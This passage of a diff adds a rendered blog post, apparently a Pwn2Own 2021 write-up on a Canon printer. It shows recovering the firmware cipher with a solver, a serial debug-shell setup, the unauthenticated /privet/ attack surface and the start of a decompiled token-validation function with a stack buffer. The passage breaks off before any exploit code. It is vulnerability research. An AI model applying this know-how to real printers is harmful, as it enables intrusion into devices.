+   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choose&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="n"&gt;y&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;??&lt;/span&gt; &lt;span class="n"&gt;int8?&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;        &lt;span class="c1"&gt;; &amp;lt;expr&amp;gt; := x | y | &amp;lt;32-bit integer constant&amp;gt; |&lt;/span&gt;
+           &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;bop&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;expr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;expr&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  &lt;span class="c1"&gt;;           (&amp;lt;bop&amp;gt; &amp;lt;expr&amp;gt; &amp;lt;expr&amp;gt;) |&lt;/span&gt;
+           &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;uop&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;expr&lt;/span&gt;&lt;span class="p"&gt;)))]&lt;/span&gt;       &lt;span class="c1"&gt;;           (&amp;lt;uop&amp;gt; &amp;lt;expr&amp;gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bop&lt;/span&gt;
+   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choose&lt;/span&gt; &lt;span class="n"&gt;bvadd&lt;/span&gt; &lt;span class="n"&gt;bvsub&lt;/span&gt; &lt;span class="n"&gt;bvand&lt;/span&gt;      &lt;span class="c1"&gt;; &amp;lt;bop&amp;gt;  := bvadd  | bvsub | bvand |&lt;/span&gt;
+           &lt;span class="n"&gt;bvor&lt;/span&gt; &lt;span class="n"&gt;bvxor&lt;/span&gt; &lt;span class="n"&gt;bvshl&lt;/span&gt;       &lt;span class="c1"&gt;;           bvor   | bvxor | bvshl |&lt;/span&gt;
+           &lt;span class="n"&gt;bvlshr&lt;/span&gt; &lt;span class="n"&gt;bvashr&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;        &lt;span class="c1"&gt;;           bvlshr | bvashr&lt;/span&gt;
+  &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;uop&lt;/span&gt;
+   &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choose&lt;/span&gt; &lt;span class="n"&gt;bvneg&lt;/span&gt; &lt;span class="n"&gt;bvnot&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;         &lt;span class="c1"&gt;; &amp;lt;uop&amp;gt;  := bvneg | bvnot&lt;/span&gt;
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fast-int8&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="kd"&gt;#:depth&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Once this is done, we can define the constraints, based on the known plain/encrypted pairs and their position (byte counter &lt;code&gt;i&lt;/code&gt;). And then we ask Rosette for an instance of the &lt;code&gt;crypt&lt;/code&gt; program which satisfies the constraints:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;define&lt;/span&gt; &lt;span class="n"&gt;sol&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;solve&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;assert&lt;/span&gt;
+&lt;span class="c1"&gt;; removing constraints speed things up&lt;/span&gt;
+    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x62&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x3d&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="c1"&gt;; [...]        &lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x69&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x3d&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x06&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x16&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x20&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x5e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x17&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x73&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x5e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x18&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x75&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#xe8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x19&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x62&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="c1"&gt;; [...]        &lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#xc3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#xe0&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x3a&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bveq&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#xef&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#xff&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;int8&lt;/span&gt; &lt;span class="mh"&gt;#x20&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;))&lt;/span&gt;
+
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;print-forms&lt;/span&gt; &lt;span class="n"&gt;sol&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After running &lt;code&gt;racket rosette.rkt&lt;/code&gt; and waiting for a few minutes, we get the following output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt; &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="ss"&gt;define&lt;/span&gt; &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;crypt&lt;/span&gt; &lt;span class="ss"&gt;x&lt;/span&gt; &lt;span class="ss"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+ &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt;
+  &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="ss"&gt;bvor&lt;/span&gt;
+  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt; &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="ss"&gt;bvlshr&lt;/span&gt; &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;bvsub&lt;/span&gt; &lt;span class="ss"&gt;i&lt;/span&gt; &lt;span class="ss"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;list&lt;/span&gt; &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="ss"&gt;bvadd&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bv&lt;/span&gt; &lt;span class="mh"&gt;#x87&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;bv&lt;/span&gt; &lt;span class="mh"&gt;#x80&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)))&lt;/span&gt;
+  &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;bvsub&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;bvadd&lt;/span&gt; &lt;span class="ss"&gt;i&lt;/span&gt; &lt;span class="ss"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;bvadd&lt;/span&gt; &lt;span class="ss"&gt;x&lt;/span&gt; &lt;span class="ss"&gt;x&lt;/span&gt;&lt;span class="p"&gt;))))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;which is a valid decryption program ! But it's a bit untidy. So let's convert it to C, with a trivial simplification:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="nf"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(((&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="mh"&gt;0xFF&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mh"&gt;0x87&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x80&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="mh"&gt;0xFF&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="mh"&gt;0xFF&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="mh"&gt;0xFF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;and compile it with &lt;code&gt;gcc -m32 -O2&lt;/code&gt; using &lt;a href="https://godbolt.org"&gt;https://godbolt.org&lt;/a&gt; to get the optimized version:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;byte&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="nf"&gt;sub&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;byte&lt;/span&gt; &lt;span class="no"&gt;ptr&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;esp&lt;/span&gt;&lt;span class="err"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="nf"&gt;rol&lt;/span&gt;     &lt;span class="no"&gt;al&lt;/span&gt;
+&lt;span class="nf"&gt;ret&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;So our encryption algorithm was a trivial &lt;code&gt;ror(x-i, 1)&lt;/code&gt;!&lt;/p&gt;
+&lt;h2 id="exploiting-setup"&gt;Exploiting setup&lt;/h2&gt;
+&lt;p&gt;After we decrypted the firmware and noticed the serial port, we decided to set up an environment that would facilitate our exploitation of the vulnerability.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/arch.jpg" /&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;p&gt;We set up a Raspberry Pi on the same network as the printer that we also connected to the serial port of the printer. In this way we could remotely exploit the vulnerability while controlling the status of the printer via many features offered by the serial port.&lt;/p&gt;
+&lt;h2 id="serial-port-dry-shell"&gt;Serial port: dry shell&lt;/h2&gt;
+&lt;p&gt;The serial port gave us access to the aforementioned dry shell which provided incredible help to understand / control the printer status and debug it during our exploitation attempts.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/dryshell.jpg" /&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;p&gt;Among the many powerful features offered, here are the most useful ones:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The ability to perform a full memory dump:  a simple and quick way to retrieve the updated firmware unencrypted.&lt;/li&gt;
+&lt;li&gt;The ability to perform basic filesystem operations.&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The ability to list the running tasks and their associated memory segments.
+    &lt;center&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/taskl.png" /&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The ability to start an FTP daemon, this will come handy later.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The ability to inspect the content of memory at a specific address.&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img src="/images/pwn2own_2021_canon_imageclass_mf644cdw_writeup/drymemory.jpg" /&gt;&lt;/center&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;This feature was used a lot to understand what was going on during exploitation attempts. One of the annoying things is the presence of a watchdog which restarts the whole printer if the HTTP daemon crashes. We had to run this command quickly after any exploitation attempts.&lt;/p&gt;
+&lt;h1 id="vulnerability"&gt;Vulnerability&lt;/h1&gt;
+&lt;h2 id="attack-surface"&gt;Attack surface&lt;/h2&gt;
+&lt;p&gt;The Pwn2Own rules state that if there's authentication, it should be bypassed. Thus, the easiest way to win is to find a vulnerability in a non authenticated feature. This includes obvious things like:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Printing functions and protocols,&lt;/li&gt;
+&lt;li&gt;Various web pages,&lt;/li&gt;
+&lt;li&gt;The HTTP server,&lt;/li&gt;
+&lt;li&gt;The SNMP server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We started by enumerating the "regular" web pages that are handled by the web server (by checking the registered pages in the code), including the weird &lt;code&gt;/elf/&lt;/code&gt; subpages. We then realized some other URLs were available in the firmware, which were not obviously handled by the usual code: &lt;code&gt;/privet/&lt;/code&gt;, which are used for cloud based printing.&lt;/p&gt;
+&lt;h2 id="vulnerable-function"&gt;Vulnerable function&lt;/h2&gt;
+&lt;p&gt;Reverse engineering the firmware is rather straightforward, even if the binary is big. The CPU is standard ARMv7. By reversing the handlers, we quickly found the following function. Note that all names were added manually, either taken from debug logging strings or after reversing:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="kr"&gt;__fastcall&lt;/span&gt; &lt;span class="nf"&gt;ntpv_isXPrivetTokenValid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;tklen&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r0&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;colon&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r1&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;v4&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r1&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r4&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;v7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r2&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;v8&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r3&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;lvl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r1&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;time_delta&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r0&lt;/span&gt;
+  &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// r2&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; &lt;span class="c1"&gt;// [sp+4h] [bp-174h] BYREF&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;str_to_hash&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; &lt;span class="c1"&gt;// [sp+104h] [bp-74h] BYREF&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;sha1_res&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; &lt;span class="c1"&gt;// [sp+120h] [bp-58h] BYREF&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;sha1_from_token&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; &lt;span class="c1"&gt;// [sp+138h] [bp-40h] BYREF&lt;/span&gt;
+  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;last_part&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt; &lt;span class="c1"&gt;// [sp+150h] [bp-28h] BYREF&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// [sp+15Ch] [bp-1Ch] BYREF&lt;/span&gt;
+  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;sha1len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;// [sp+164h] [bp-14h] BYREF&lt;/span&gt;
+
+  &lt;span class="n"&gt;bzero&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x100u&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;bzero&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sha1_from_token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x18u&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;last_part&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;last_part&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+  &lt;span class="n"&gt;bzero&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;str_to_hash&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x1Cu&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;bzero&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sha1_res&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x18u&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+  &lt;span class="n"&gt;sha1len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="n"&gt;ischeckXPrivetToken&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt;
+  &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;tklen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
